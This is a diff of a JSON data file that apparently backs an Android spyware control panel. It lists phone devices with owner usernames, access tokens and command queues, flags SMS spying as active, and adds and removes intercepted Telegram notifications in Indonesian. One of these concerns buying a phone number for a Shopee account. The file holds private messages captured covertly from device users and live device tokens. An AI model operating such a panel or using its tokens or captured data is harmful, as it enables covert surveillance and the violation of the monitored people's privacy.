@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776772686212,
+    "lastSeen": 1776772691915,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776772685086,
+    "lastSeen": 1776772691183,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776772686999,
+    "lastSeen": 1776772690651,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
+        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: Shopee\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******82\n• Waktu: 21/04/2026, 18.52",
+        "time": "21/04 18:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776772687141
+      },
       {
         "appName": "Telegram",
         "sender": "Fastcal haikk",
@@ -14394,14 +14402,6 @@
         "time": "21/04 18:13",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776769992398
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16577 pesan baru dari 112 obrolan",
-        "time": "21/04 18:13",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769992211
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776772686105,
+    "lastSeen": 1776772690865,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
